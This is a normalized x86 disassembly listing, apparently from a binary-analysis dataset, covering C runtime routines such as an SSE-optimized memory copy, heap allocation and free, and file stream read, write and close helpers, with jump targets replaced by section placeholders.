jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40e2fc ]
jmp [ ecx * 4 + jump_table_40e37c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40e3e8 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40e584 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40e3e8 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40e584 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40e584 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40e584 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40e3e8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40e3e8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40e3e8 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_40e3e8 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40e702
push ebp
mov ebp esp
lea eax [ ecx + 0x9 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
call sub_410e60
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_40e720
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40e6f4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40e8f2#2
pop ecx
sub_40e73f
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40e92a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_410f5d
pop ecx
test eax eax
je r-xdata
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_40f750
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_4107db
int3
sub_40e78e
push esi
push 0x4
push 0x20
call sub_410fc1
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40e7bd
push 0xc
push r--data
call sub_4110a0
call sub_40fe06
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40e7fd
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e7f7
mov eax esi
call sub_4110e5
retn
sub_40e7fd
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_410f90
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_411054
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_411054
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_40e8f2
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_411550
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_411563
pop ecx
mov [ esi ] eax
pop esi
sub_40e92a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_410f5d
pop ecx
call sub_411550
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_411295
push 0x1e
call sub_4112f2
push 0xff
call sub_40fc9b
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_411550
mov [ eax ] ebx
push esi
call sub_410f5d
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_411550
mov [ eax ] ebx
sub_40e9bc
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_411550
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_411550
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
sub_40ea28
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_411550
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_411550
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
sub_40ea89
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
call sub_411a0c
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41174f
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov [ ecx ] bl
mov ecx [ ebp - 0x20 ]
inc ecx
mov [ ebp - 0x20 ] ecx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41174f
pop ecx
pop ecx
mov [ ecx ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
sub_40eb78
push 0xc
push r--data
call sub_4110a0
xor ecx ecx
mov [ ebp - 0x1c ] ecx
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
xor eax eax
cmp [ ebx ] cx
setne al
test eax eax
je r-xdata
call sub_4110e5
retn
call sub_412a6d
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ edi ] ax
jne r-xdata
call sub_411550
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_412b85
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ec3a
mov eax edi
call sub_411550
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_412e30
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40ec42
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_412fec
push esi
mov edi eax
call sub_413f84
push esi
call sub_412f82
push eax
call sub_413e20
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_40e8f2
and [ esi + 0x1c ] 0x0
pop ecx
sub_40ecae
push 0xc
push r--data
call sub_4110a0
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
push esi
call sub_412997
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40ec42
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ed1d
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_4110e5
retn
sub_40ed25
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_411550
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
jbe r-xdata
test esi esi
je r-xdata
push [ ebp + 0xc ]
push 0x0
push ecx
call sub_414160
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
ja r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
mov [ ebp - 0xc ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push esi
call sub_413fb4
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
cmp ebx 0x7fffffff
ja r-xdata
xor edx edx
cmp ebx 0x7fffffff
jbe r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] al
inc edx
dec ebx
dec ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax ebx
mov eax ebx
div ecx
mov eax ebx
mov eax 0x7fffffff
div ecx
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
ja r-xdata
mov eax ebx
mov [ ebp - 0x10 ] ebx
call sub_411550
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_414160
add esp 0xc
push eax
push [ ebp - 0x4 ]
push esi
call sub_412f82
pop ecx
push eax
call sub_4133e3
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push eax
push [ esi ]
push ecx
push [ ebp - 0x4 ]
call sub_4140d5
mov eax [ ebp - 0x10 ]
sub [ esi + 0x4 ] eax
add esp 0x10
sub ebx eax
add [ esi ] eax
jmp r-xdata
call sub_411714
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
add [ ebp - 0x4 ] eax
sub [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
jmp r-xdata
sub ebx eax
test ebx ebx
jne r-xdata
sub_40ef03
push 0xc
push r--data
call sub_4110a0
xor edi edi
mov [ ebp - 0x1c ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
jne r-xdata
push esi
call sub_412997
pop ecx
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ed25
add esp 0x14
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ef8c
mov eax edi
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_4110e5
retn
call sub_411550
mov [ eax ] 0x16
call sub_411714
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_414160
add esp 0xc
sub_40ef94
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
xor edx edx
div ecx
cmp ebx eax
ja r-xdata
mov edi ecx
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov edx [ esi + 0xc ]
and edx 0x108
je r-xdata
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_41174f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test edx edx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ecx [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x4 ] ecx
test ecx ecx
jg r-xdata
mov eax ebx
test ecx ecx
je r-xdata
push esi
call sub_412fec
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
test ebx ebx
jne r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ebx
xor edx edx
div ecx
mov eax ebx
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push [ esi ]
call sub_410100
mov eax [ ebp - 0x8 ]
sub [ esi + 0x4 ] eax
add [ esi ] eax
add esp 0xc
sub ebx eax
add [ ebp + 0x8 ] eax
jmp r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x8 ]
push esi
call sub_412f82
pop ecx
push eax
call sub_4141f0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] edx
sub ebx edx
cmp eax ecx
jb r-xdata
mov edx eax
sub_40f0eb
push 0xc
push r--data
call sub_4110a0
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov esi [ ebp + 0x14 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_412997
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ef94
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f161
mov eax edi
jmp r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
call sub_4110e5
retn
sub_40f169
push 0xc
push r--data
call sub_4110a0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
xor eax eax
cmp [ ebx ] al
setne al
test eax eax
je r-xdata
call sub_4110e5
retn
call sub_412a6d
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi ] 0x0
jne r-xdata
call sub_411550
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_414afc
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f225
mov eax edi
call sub_411550
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_412e30
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40f242
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
pop ebp
retn
call sub_411550
mov [ eax ] 0x16
call sub_411714
xor eax eax
pop ebp
retn
sub_40f268
push 0x18
push r--data
call sub_4110a0
mov eax [ ebp + 0x8 ]
mov ebx eax
mov edi eax
mov [ ebp - 0x1c ] edi
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] eax
setge al
test eax eax
je r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
xor eax eax
mov esi [ ebp + 0x10 ]
test esi esi
setne al
test eax eax
je r-xdata
call sub_4110e5
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x20 ] esi
push esi
call sub_412997
pop ecx
and [ ebp - 0x4 ] 0x0
test [ esi + 0xc ] 0x40
jne r-xdata
test edi edi
je r-xdata
push esi
call sub_412f82
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f39f
mov eax edi
dec [ ebp + 0xc ]
je r-xdata
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
mov [ ebx ] 0x0
dec [ esi + 0x4 ]
js r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
xor edi edi
mov [ ebp - 0x1c ] edi
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push esi
call sub_413fb4
pop ecx
mov ecx eax
mov eax [ esi ]
movzx ecx [ eax ]
inc eax
mov [ esi ] eax
jmp r-xdata
mov edx rw-data
